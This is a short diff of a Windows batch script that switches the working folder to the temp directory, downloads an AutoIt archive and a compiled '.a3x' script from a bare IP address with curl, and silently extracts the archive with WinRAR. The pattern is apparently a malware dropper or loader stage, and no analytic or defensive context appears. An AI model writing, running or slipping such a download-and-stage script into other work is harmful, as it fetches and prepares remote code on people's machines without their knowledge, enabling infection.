@@ -1,5 +1,5 @@
 @echo off
-:: cd %temp%
+cd %temp%
 curl -O http://103.97.127.14/AutoIt3.rar
 curl -O http://103.97.127.14/SomeThing.a3x
 "C:\Program Files\WinRAR\WinRAR.exe" x -ibck "AutoIt3.rar" "\"
